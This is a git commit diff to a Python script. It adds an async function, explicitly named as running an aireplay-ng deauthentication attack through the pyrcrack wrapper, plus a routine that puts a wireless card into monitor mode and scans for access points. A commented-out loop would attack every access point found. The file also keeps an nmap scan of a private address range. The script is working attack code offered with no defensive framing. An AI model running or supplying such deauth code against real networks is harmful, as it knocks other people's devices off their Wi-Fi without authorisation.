c4fde2c1a7cade9e5342e631e88e5e40f701dea8
Dylan Soechting <dsoechting@gmail.com>
2018-11-25 17:51:12 -0600

    package dependencies

--- main.py
+++ main.py
@@ -1,10 +1,12 @@
 import pyrcrack
 import nmap
+import sys
+import asyncio
 
 
 
 def runNmap(ip):
-    # ip = '10.202.208.1-30'
+    # ip = '10.202.208.1'
     ports = '30'
     nm = nmap.PortScanner()
     nm.scan(ip, ports)
@@ -20,4 +22,33 @@ def runNmap(ip):
         # tempIP = '10.202.208.' + str((x + 1))
         print(nm[x].hostname())
 
-runNmap('10.202.208.1-30')
+async def attack(interface, apo):
+    """Run aireplay deauth attack."""
+    async with pyrcrack.AirmonNg() as airmon:
+        await airmon.set_monitor(interface['interface'], apo.channel)
+        async with pyrcrack.AireplayNg() as aireplay:
+            await aireplay.run(
+                interface['interface'], deauth=sys.argv[1], D=True)
+            print(await aireplay.proc.communicate())
+
+
+async def deauth():
+    """Scan for targets, return json."""
+    async with pyrcrack.AirmonNg() as airmon:
+        interface = (await airmon.list_wifis())[0]['interface']
+        interface = (await airmon.set_monitor(interface))[0]
+        print(interface)
+        # async with pyrcrack.AirodumpNg() as pdump:
+        #     await pdump.run(interface['interface'], write_interval=1)
+        #     while True:
+        #         await asyncio.sleep(3)
+        #         for apo in pdump.sorted_aps():
+        #             await attack(interface, apo)
+
+async def printing():
+    async with pyrcrack.AirmonZc() as airmon:
+        print(await airmon.list_wifis())
+
+# runNmap('10.202.208.1-30')
+asyncio.run(deauth())
+# asyncio.run(printing())
